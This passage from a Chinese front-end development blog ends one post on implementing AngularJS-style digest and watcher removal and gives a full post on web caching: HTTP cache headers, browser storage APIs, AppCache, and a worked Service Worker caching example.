this.$clearPhase();</span><br><span class="line">      throw &quot;10 digest iterations reached&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; while (dirty);</span><br><span class="line">  this.$clearPhase();</span><br><span class="line"> </span><br><span class="line">  while (this.$$postDigestQueue.length) &#123; //在digest最后执行</span><br><span class="line">    try &#123;</span><br><span class="line">      this.$$postDigestQueue.shift()();</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">      (console.error || console.log)(e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="销毁一个监听器"><a href="#销毁一个监听器" class="headerlink" title="销毁一个监听器"></a>销毁一个监听器</h1><p>在注册监听器时，返回一个销毁该监听器的函数，如果将来要销毁该监听器，就将返回的函数保存<br>在销毁时，直接执行该函数即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$watch = function(watchFn, listenerFn, valueEq) &#123;</span><br><span class="line">  var self = this;</span><br><span class="line">  var watcher = &#123;</span><br><span class="line">    watchFn: watchFn,</span><br><span class="line">    listenerFn: listenerFn,</span><br><span class="line">    valueEq: !!valueEq</span><br><span class="line">  &#125;;</span><br><span class="line">  self.$$watchers.push(watcher);</span><br><span class="line">  return function() &#123;</span><br><span class="line">    var index = self.$$watchers.indexOf(watcher);</span><br><span class="line">    if (index &gt;= 0) &#123;</span><br><span class="line">      self.$$watchers.splice(index, 1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">var scope = new Scope();</span><br><span class="line">var removeWatch = scope.$watch(</span><br><span class="line">  function(scope) &#123;</span><br><span class="line">    return scope.aValue;</span><br><span class="line">  &#125;,</span><br><span class="line">  function(newValue, oldValue, scope) &#123;</span><br><span class="line">    scope.counter++;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line">removeWatch();</span><br></pre></td></tr></table></figure></p>
<p><a href="https://github.com/xufei/Make-Your-Own-AngularJS/blob/master/01.md" target="_blank" rel="noopener">文档链接</a><br><a href="https://github.com/YooHannah/algorithm/blob/master/baseJs/angulardigest.js" target="_blank" rel="noopener">完整代码</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/cache/cache.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/performance/cache/cache.html" itemprop="url">
                  关于缓存
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-22T16:54:02+08:00">
                2017-10-22
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="缓存的好处"><a href="#缓存的好处" class="headerlink" title="缓存的好处"></a>缓存的好处</h1><p> 利用缓存，可减少对源服务器的访问，因此也就节省了通信流量和通信时间<br> 从而减少了延迟(加快页面打开速度)，降低网络负载，保证稳定性(服务能正常使用)</p>
<h1 id="浏览器本地存储与服务器端存储之间的区别"><a href="#浏览器本地存储与服务器端存储之间的区别" class="headerlink" title="浏览器本地存储与服务器端存储之间的区别"></a>浏览器本地存储与服务器端存储之间的区别</h1><p>其实数据既可以在浏览器本地存储，也可以在服务器端存储。</p>
<p>浏览器端可以保存一些数据，需要的时候直接从本地获取，sessionStorage、localStorage和cookie都由浏览器存储在本地的数据。</p>
<p>服务器端也可以保存所有用户的所有数据，但需要的时候浏览器要向服务器请求数据。<br>1.服务器端可以保存用户的持久数据，如数据库和云存储将用户的大量数据保存在服务器端。<br>2.服务器端也可以保存用户的临时会话数据。服务器端的session机制，如jsp的 session 对象，数据保存在服务器上。实现上，服务器和浏览器之间仅需传递session id即可，服务器根据session id找到对应用户的session对象。会话数据仅在一段时间内有效，这个时间就是server端设置的session有效期。</p>
<p>服务器端保存所有的用户的数据，所以服务器端的开销较大，而浏览器端保存则把不同用户需要的数据分布保存在用户各自的浏览器中。<br>浏览器端一般只用来存储小数据，而服务器可以存储大数据或小数据。<br>服务器存储数据安全一些，浏览器只适合存储一般数据。</p>
<h1 id="http协议里面的缓存机制"><a href="#http协议里面的缓存机制" class="headerlink" title="http协议里面的缓存机制"></a>http协议里面的缓存机制</h1><p>相关首部字段</p>
<p>Expires:资源失效日期<br>收到该字段后会缓存资源，再将缓存的资源给客户端，对于以后的请求，在该时间之前，响应缓存资源，当超过该时间后，缓存服务器在请求发来时，会向服务器请求资源<br>漏洞：用户时间和服务器时间不一致的话，会造成用户资源更新不及时</p>
<p>cache-control:通过配置参数，设置缓存机制，相关参数如下：<br>public:允许多用户共享缓存<br>private：只允许特定用户使用缓存<br>no-cache:在请求中配置，告诉服务器，我不要缓存的响应,中间服务器必须从源服务器取资源;<br>在响应中配置，告诉中间服务器不能对响应进行缓存，源服务器以后对中间服务器提出的有效性校验不在进行确认<br>no-store:请求/响应中含有机密信息，不允许缓存资源<br>max-age:缓存保存时长<br>缓存保存到现在的时长小于该值，就可以返回缓存，否则像源服务器请求资源</p>
<p>last-modified:资源最终修改时间<br>服务器会比较请求的该值与资源最终修改时间，不一致的话就返回新资源，一致的话，就返回304，not modified<br>漏洞：时间精确度到秒，可能存在同一秒保存两次文件，无法区分，<br>也可能因为通过cdn,造成服务器上文件修改时间并不一致</p>
<p>E-Tag:服务器为每份资源提供的唯一性标识，相当于文件MD5值<br>服务器会跟剧请求的if-no-match与资源ttag比较，不一致返回新资源，一致返回304</p>
<p>服务器处理机制：<br>当首部字段Cache-Control有指定max-age指令，Expires也存在时，会优先处理max-age，用于判断资源是否失效<br>当判断max-age失效后，会去判断last-modified和E-Tag，如果服务器仅支持http1.0,则仅根据last-modified做校验<br>如果服务器支持http1.1,则先根据E-Tag做校验，然后在根据last-modified做校验<br><a href="https://iammapping.com/the-http-guide-of-web-cache/" target="_blank" rel="noopener">相关链接</a></p>
<h1 id="资源缓存"><a href="#资源缓存" class="headerlink" title="资源缓存"></a>资源缓存</h1><p>HTML等页面文件:短效缓存，本地服务器<br>更新策略:使用no-cache</p>
<p>css、js:长效缓存，CDN<br>更新策略：在URI上添加更新标识(md5,timestamp,version)<br>MD5：不同文件MD5值如果相同，有覆盖危险<br>timestamp:文件修改/上线时间，因为可能存在不正确性，所以需要其他操作判断文件是否有变化<br>version:每次都需要更新版本号</p>
<p>Image:长效缓存,CDN<br>更新策略：使用随机名字</p>
<h1 id="数据缓存"><a href="#数据缓存" class="headerlink" title="数据缓存"></a>数据缓存</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>在web storage出现前，缓存都放在cookie里面，但存储数量有限，而且每次请求都会携带一堆数据，就会占用宽带<br>工作原理<br>       当浏览器访问服务器时，服务器可以将少量数据以set-cookie消息头的方式发送给浏览器,浏览器会将这些数据临时保存下来。<br>       当浏览器再次访问服务器，会将之前保存的这些数据以cookie消息头的方式发送给服务器。<br>cookie的限制<br>     a. cookie可以被用户禁止。<br>     b. cookie不安全(对于敏感数据，需要加密)。<br>     c. cookie只能保存少量的数据(大约是4k)。<br>     d. cookie的数量也有限制(大约是几百个)。<br>     e.cookie只能保存字符串<br>生存时间问题<br>      缺省情况下，浏览器会把cookie保存在内存里面，只要浏览器不关闭，cookie就会一直存在，浏览器关闭，cookie就会被销毁。<br><a href="http://blog.csdn.net/u011637069/article/details/49799807" target="_blank" rel="noopener">相关链接</a><br><a href="http://www.cnblogs.com/kkgreen/archive/2011/04/12/2014282.html" target="_blank" rel="noopener">相关链接</a></p>
<h2 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h2><p>大小有限制，数据不安全/不可信(有xss风险，存爆，读取不成功，被损坏)，不应当存放重要数据，并且要做好容错<br>可以用于跨页面通讯<br>永久性的本地存储<br>将数据保存在客户端硬件设备上，不管它是什么，意思就是下次打开计算机时候数据还在<br>localStorage提供了四个方法来进行对本地存储做相关操作。<br>（1）setItem(key,value)：添加本地存储数据。<br>（2）getItem(key):通过key获取相应的Value。<br>（3）removeItem(key):通过key删除本地数据。<br>（4）clear():清空数据。</p>
<h2 id="SessionStorage"><a href="#SessionStorage" class="headerlink" title="SessionStorage"></a>SessionStorage</h2><p>类似localStorage,但在窗口关闭后不存在<br>会话级别的本地存储<br>通过此对象可以直接操作存储在浏览器中的会话级别的WebStorage。<br>存储在sessionStorage中的数据首先是Key-Value形式的<br>另外就是它跟浏览器当前会话相关，当会话结束后，数据会自动清除，跟未设置过期时间的Cookie类似。即窗口关闭，数据清除<br>sessionStorage提供了四个方法来进行对本地存储做相关操作。<br>（1）setItem(key,value)：添加本地存储数据。<br>（2）getItem(key):通过key获取相应的Value。<br>（3）removeItem(key):通过key删除本地数据。<br>（4）clear():清空数据。<br>注意区别session机制<br>session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。<br>当程序需要为某个客户端的请求创建一个session时，服务器首先检查这个客户端的请求里是否已包含了一个session标识(称为session id），如果已包含则说明以前已经为此客户端创建过session，服务器就按照session id把这个session检索出来使用(检索不到，会新建一个），如果客户端请求不包含session id，则为此客户端创建一个session并且生成一个与此session相关联的session id，session id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个session id将被在本次响应<br>中随cookie返回给客户端保存。<br>即<br>Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中<br>但cookie可以被人为的禁止，则必须有其他机制以便在cookie被禁止时仍然能够把session id传递回服务器。</p>
<p>经常被使用的一种技术叫做URL重写，就是把session id直接附加在URL路径的后面。还有一种技术叫做表单隐藏字段。就是服务器<br>会自动修改表单，添加一个隐藏字段，以便在表单提交时能够把session id传递回服务器</p>
<h2 id="sessionStorage-、localStorage-和-cookie-之间的区别"><a href="#sessionStorage-、localStorage-和-cookie-之间的区别" class="headerlink" title="sessionStorage 、localStorage 和 cookie 之间的区别"></a>sessionStorage 、localStorage 和 cookie 之间的区别</h2><p>共同点：都是保存在浏览器端，且同源的。<br>区别：<br>1.cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递。而sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下。<br>2.存储大小限制也不同，cookie数据不能超过4k，同时因为每次http请求都会携带cookie，所以cookie只适合保存很小的数据，如会话标识。sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。<br>3.数据有效期不同，sessionStorage：仅在当前浏览器窗口关闭前有效，自然也就不可能持久保持；localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；cookie只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。<br>4.作用域不同，sessionStorage不在不同的浏览器窗口中共享，即使是同一个页面；localStorage 在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的。<br>5.Web Storage 支持事件通知机制，可以将数据更新的通知发送给监听者。<br>6.Web Storage 的 api 接口使用更方便。<br><a href="http://blog.csdn.net/chen_zw/article/details/18924875" target="_blank" rel="noopener">Cache-control参数解析</a></p>
<h2 id="web-SQL"><a href="#web-SQL" class="headerlink" title="web SQL"></a>web SQL</h2><p>在浏览器端创建的一个本地的数据库，而且支持标准的SQL的CRUD操作，让离线的Web应用更加方便的存储结构化的数据<br>Web SQL Database 规范中定义的三个核心方法：<br>openDatabase：这个方法使用现有数据库或新建数据库来创建数据库对象<br>transaction：这个方法允许我们根据情况控制事务提交或回滚<br>executeSql：这个方法用于执行SQL 查询，用SQL语句做查询索引工作<br><a href="http://www.cnblogs.com/dolphinX/p/3405335.html" target="_blank" rel="noopener">使用链接</a><br><a href="http://www.cnblogs.com/fly_dragon/p/3946012.html" target="_blank" rel="noopener">实例参考</a><br>实际上已经被废弃</p>
<h2 id="indexDB"><a href="#indexDB" class="headerlink" title="indexDB"></a>indexDB</h2><p>适用持续化的数据，不会被清除的数据<br>也相当于在本地创建数据库,通过调用API接口进行数据操作，<br>在IndexedDB大部分操作并不是常用的调用方法，返回结果的模式，而是请求——响应的模式，比如打开数据库的操作<br>不会返回一个DB对象的句柄，得到的是一个IDBOpenDBRequest对象，而希望得到的DB对象在其result属性中<br>对数据的所有操作，增删改查，均通过调用api函数实现<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API" target="_blank" rel="noopener">MDN接口文档</a><br><a href="http://www.cnblogs.com/dolphinX/p/3415761.html" target="_blank" rel="noopener">使用教程1</a><br><a href="http://www.cnblogs.com/dolphinX/p/3416889.html" target="_blank" rel="noopener">使用教程2</a><br>持续化存储，可在 web worker中使用</p>
<h1 id="离线缓存"><a href="#离线缓存" class="headerlink" title="离线缓存"></a>离线缓存</h1><h2 id="离线缓存之App-Cache"><a href="#离线缓存之App-Cache" class="headerlink" title="离线缓存之App Cache"></a>离线缓存之App Cache</h2><p>AppCache就是对app内存缓存的方案，具体表现为当请求某个文件时不是从网络获取该文件，而是从本地获取。<br>应用程序缓存为应用带来三个优势：<br>离线浏览 - 用户可在应用离线时使用它们<br>速度 - 已缓存资源加载得更快<br>减少服务器负载 - 浏览器将只从服务器下载更新过或更改过的资源</p>
<p>缺点：<br>可能会缓存错误页面，甚至缓存运营商的劫持广告<br>更新中有一个文件失败了，就会全部退回上一个版本<br>由于是Lazy更新，如果后台接口有break change将会是大麻烦<br>manifest文件也有可能不小心被缓存了</p>
<p>manifest 文件是简单的文本文件，它告知浏览器被缓存的内容（以及不缓存的内容）。<br>manifest 文件可分为三个部分：<br>CACHE MANIFEST - 在此标题下列出的文件将在首次下载后进行缓存，等价于CACHE：<br>NETWORK - 在此标题下列出的文件需要与服务器的连接，且不会被缓存<br>FALLBACK - 在此标题下列出的文件规定当页面无法访问时的回退页面（比如 404 页面<br><a href="http://blog.csdn.net/liqinghua1653/article/details/31387761" target="_blank" rel="noopener">机制分析</a></p>
<h2 id="离线缓存之service-worker"><a href="#离线缓存之service-worker" class="headerlink" title="离线缓存之service worker"></a>离线缓存之service worker</h2><p>service worker 相当于在浏览器的请求层建了一个服务器，所有的请求都会进入service worker进行处理，决定资源使用缓存还是从新获取服务器资源<br>service worker可以：<br>后台消息传递<br>网络代理，转发请求，伪造响应<br>离线缓存<br>消息推送<br>…</p>
<p>使用时必须使用HTTPS请求协议</p>
<p>在 installing 状态中，Service Worker 脚本中的 install 事件被执行。通常在安装事件中，为 document 缓存静态文件<br>处于 activating 状态期间，Service Worker 脚本中的 activate 事件被执行。通常在 activate 事件中，清理 cache 中的文件<br>如果 Service Worker 处于激活态，就可以监听事件性事件 —— fetch 和 message。<br>service worker可以通过fetch事件拦截请求，并且给出自己的响应。<br>页面和serviceWorker之间可以通过posetMessage()方法发送消息，发送的消息可以通过message事件接收到。</p>
<p>w3c提供了一个新的fetch api，用于取代XMLHttpRequest，与XMLHttpRequest最大不同有两点：</p>
<ol>
<li>fetch()方法返回的是Promise对象，通过then方法进行连续调用，减少嵌套。ES6的Promise在成为标准之后，会越来越方便开发人员。</li>
<li>提供了Request、Response对象，如果做过后端开发，对Request、Response应该比较熟悉。前端要发起请求可以通过url发起，也可以使用Request对象发起，而且Request可以复用。但是Response用在哪里呢？在service worker出现之前，前端确实不会自己给自己发消息，但是有了service worker，就可以在拦截请求之后根据需要发回自己的响应，对页面而言，这个普通的请求结果并没有区别，这是Response的一处应用。</li>
</ol>
<p>1.注册<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//在页面文件注册</span><br><span class="line">if (navigator.serviceWorker) &#123;</span><br><span class="line">        // 注册Service Worker scope表示作用的页面的path</span><br><span class="line">        // register函数返回Promise</span><br><span class="line">        navigator.serviceWorker.register(&apos;./service-worker.js&apos;, &#123;scope: &apos;./&apos;&#125;)</span><br><span class="line">            .then(function (registration) &#123;</span><br><span class="line">                console.log(registration);</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch(function (e) &#123;</span><br><span class="line">                console.error(e);</span><br><span class="line">            &#125;)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        console.log(&apos;Service Worker is not supported in this browser.&apos;)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>上面的代码检查 service worker API 是否可用，如果可用， /service-worker.js 这个文件将会作为 service worker 被注册。<br>scope表示作用的页面的path</p>
<p>2.安装使用<br>service-worker.js文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">importScripts(&apos;js/cache-polyfill.js&apos;); // cache 扩展</span><br><span class="line"></span><br><span class="line">var CACHE_VERSION = &apos;app-v1&apos;; // 缓存文件的版本</span><br><span class="line">var CACHE_FILES = [ // 需要缓存的页面文件</span><br><span class="line">    &apos;/&apos;,</span><br><span class="line">    &apos;images/background.jpeg&apos;,</span><br><span class="line">    &apos;js/app.js&apos;,</span><br><span class="line">    &apos;css/styles.css&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;install&apos;, function (event) &#123; // 监听worker的install事件</span><br><span class="line">    event.waitUntil( // 延迟install事件直到缓存初始化完成</span><br><span class="line">        caches.open(CACHE_VERSION) //开启一个缓存</span><br><span class="line">            .then(function (cache) &#123;</span><br><span class="line">                console.log(&apos;Opened cache&apos;);</span><br><span class="line">                return cache.addAll(CACHE_FILES); //缓存文件</span><br><span class="line">                //这个过程是通过一连串 promise （caches.open 和 cache.addAll）完成的。</span><br><span class="line">                //event.waitUntil 会拿到一个 promise ，并使用其来获取安装耗费的时间以及是否安装成功。</span><br><span class="line">                //如果所有的文件都缓存成功，service worker 就安装成功了。</span><br><span class="line">                //如果任何一个文件下载失败，那么安装步骤就会失败。这个方式依赖于自己指定的资源，但这意味着，需要非常仔细地确定哪些文件需要被缓存。</span><br><span class="line">                //指定了太多文件的话，会增加失败率</span><br><span class="line">                //可以在 install 事件中执行其他操作，甚至忽略 install 事件</span><br><span class="line">            &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;activate&apos;, function (event) &#123; // 监听worker的activate事件,正在激活状态会触发该事件，更新service worker时，也会触发</span><br><span class="line">    event.waitUntil( // 延迟activate事件直到</span><br><span class="line">        caches.keys().then(function(keys)&#123;</span><br><span class="line">            return Promise.all(keys.map(function(key, i)&#123; // 清除旧版本缓存</span><br><span class="line">                if(key !== CACHE_VERSION)&#123;</span><br><span class="line">                    return caches.delete(keys[i]);</span><br><span class="line">                    //需要在 activate 的 callback 中进行 cache 管理，来清理老的 cache。</span><br><span class="line">                    //在 activate 而不是 install 的时候进行的原因，是如果在 install 的时候进行清理，</span><br><span class="line">                    //那么老的 service worker 仍然在控制页面，他们依赖的缓存就失效了，因此就会突然被停止</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;))</span><br><span class="line">        &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123; // 截取页面的资源请求</span><br><span class="line">    event.respondWith( // 返回页面的资源请求</span><br><span class="line">        caches.match(event.request).then(function(res)&#123; // 判断缓存是否命中</span><br><span class="line">            if(res)&#123;  // 返回缓存中的资源</span><br><span class="line">                return res;</span><br><span class="line">            &#125;</span><br><span class="line">            requestBackend(event); // 执行请求备份操作</span><br><span class="line">        &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function requestBackend(event)&#123;  // 请求备份操作</span><br><span class="line">    var url = event.request.clone();</span><br><span class="line">    return fetch(url).then(function(res)&#123; // 请求线上资源</span><br><span class="line">        //if not a valid response send the error</span><br><span class="line">        //确保 response 有效</span><br><span class="line">				//检查 response 的状态是200</span><br><span class="line">				//确保 response 的类型是 basic 类型的，这说明请求是同源的，这意味着第三方的请求不能被缓存。</span><br><span class="line">        if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line">            return res;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var response = res.clone();</span><br><span class="line">        //如果检查通过会clone 这个请求。</span><br><span class="line">        //这么做的原因是如果 response 是一个 Stream，那么它的 body 只能被消费一次。</span><br><span class="line">        //所以为了让浏览器跟缓存都使用这个body,必须克隆这个 body，一份到浏览器，一份到缓存中缓存</span><br><span class="line"></span><br><span class="line">        caches.open(CACHE_VERSION).then(function(cache)&#123; // 缓存从线上获取的资源</span><br><span class="line">            cache.put(event.request, response);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        return res;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>service worker 更新步骤：<br>1.更新 service worker 的 JavaScript 文件<br>  当用户浏览你的网站时，浏览器尝试在后台重新下载 service worker 的脚本文件。<br>  经过对比，只要服务器上的文件和本地文件有一个字节不同，这个文件就认为是新的。<br>2.之后更新后的 service worker 启动并触发 install 事件。<br>3.此时，当前页面生效的依然是老版本的 service worker，新的 service worker 会进入 “waiting” 状态。<br>4.当页面关闭之后，老的 service worker 会被干掉，新的 servicer worker 接管页面<br>5.一旦新的 service worker 生效后会触发 activate 事件。</p>
<p>关于 service worker 的一些注意点：<br>1.service worker 是一个JavaScript worker ,所以它不能直接访问 DOM 。相反, service worker 可以通过postMessage 接口与跟其相关的页面进行通信,发送消息,从而让这些页面在有需要的时候去操纵 DOM 。<br>2.Service worker 是一个可编程的网络代理，允许你去控制如何处理页面的网络请求。<br>3.Service worker 在不使用时将被终止，并会在需要的时候重新启动，因此你不能把onfetch 和 onmessage事件来作为全局依赖处理程序。如果你需要持久话一些信息并在重新启动Service worker后使用他，可以使用 IndexedDBAPI ，service worker 支持。 　　<br>4.Service worker 广泛使用了 promise<br>缺点：<br>如果安装失败了，没有一个很好的方式来知晓<br>fetch api()目前仅支持Service Workers中使用<br>fetch() 中不会被触发重定向<br>页面在改变 hash 时，service worker 会停止工作</p>
<p><a href="https://segmentfault.com/a/1190000006061528" target="_blank" rel="noopener">Service Worker 生命周期</a><br><a href="https://zhuanlan.zhihu.com/p/20040372" target="_blank" rel="noopener">Service Worker那些事</a><br><a href="https://zhuanlan.zhihu.com/p/27264234" target="_blank" rel="noopener">深入了解 Service Worker</a><br><a href="http://www.alloyteam.com/2016/01/9274/" target="_blank" rel="noopener">Service Worker初体验</a><br><a href="https://serviceworke.rs/" target="_blank" rel="noopener">serviceworke Introduction</a></p>
<h2 id="离线缓存之-Hybrid-Cache离线包"><a href="#离线缓存之-Hybrid-Cache离线包" class="headerlink" title="离线缓存之 Hybrid Cache离线包"></a>离线缓存之 Hybrid Cache离线包</h2><p>前端开发”就是使用 HTML、CSS、JS 技术给一个网站或 Web 应用开发图形用户界面<br>所以，前端应用本质上一个 GUI 程序，而 GUI 程序有三种典型形态：<br>Web : 以浏览器为运行环境，基于浏览器内核支持的编程语言、API 来实现，被浏览器解释执行<br>Native : 以操作系统为运行环境，基于操作系统原生支持的编程语言、API 接口实现，以二进制包的形式运行<br>Hybird : 基于 Native 应用提供的一个支持 HTML、CSS、JS 的容器开发的应用，相当与用开发 Web 的方式开发 Native 应用</p>
<p>原理：<br>1.o2o 在线资源抓取程序：基于 phantomjs 解析资源<br>2.grunt-inc-offline 增量包计算器：基于 git-diff 的增量包运算<br>3.离线包生成器<br><img src="/image/CACHE1.png" alt="CACHE1"><br>1.o2o 定时程序监听线上页面变更，将其所携带的资源（HTML、CSS、JS 和部分图片）抓取下来<br>2.增量包计算器会计算好与之前若干版本之间的增量文件，配合包生成器将增量包逐一构建打包，同时生成好每个增量包的 Diff Json<br>3.调用 Clam 命令通过 Gitlab 将资源包部署至 CDN，以备手机端更新。<br>4.Gitlab 仓库 的更新会触发一个 Hook 脚本，调用 tSync 服务器的接口，来通知资源变更<br>5.tSync 服务器沙箱完成消息封装，包括了第二步生成了的 Diff Json 文本<br>6.tSync 长连接将消息指令下发给手机终端<br>7.手机终端拼好资源文件链接，从 CDN 将增量包更新下来，随后执行 Diff Json中的指令，完成包的更新。</p>
<p>手机端的两个重要进程：</p>
<p>1.资源预加载进程：在实际访问页面之前，将资源预加载到缓存池并更新 Cache Map<br>2.创建 WebView 进程：只聚焦本地资源读写，别的什么也不干<br>手机端 touch 到网络的环节收敛到了两处，第一，Package Update Controller，第二，WebView 本身必要的网络请求<br><img src="/image/CACHE2.png" alt="CACHE2"><br><a href="https://yq.aliyun.com/articles/2939" target="_blank" rel="noopener">相关链接</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/12/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><span class="page-number current">13</span><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><a class="extend next" rel="next" href="/page/14/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/psb.jpg" alt="YooHannah">
          <p class="site-author-name" itemprop="name">YooHannah</p>
          <p class="site-description motion-element" itemprop="description"></p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">232</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">1</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
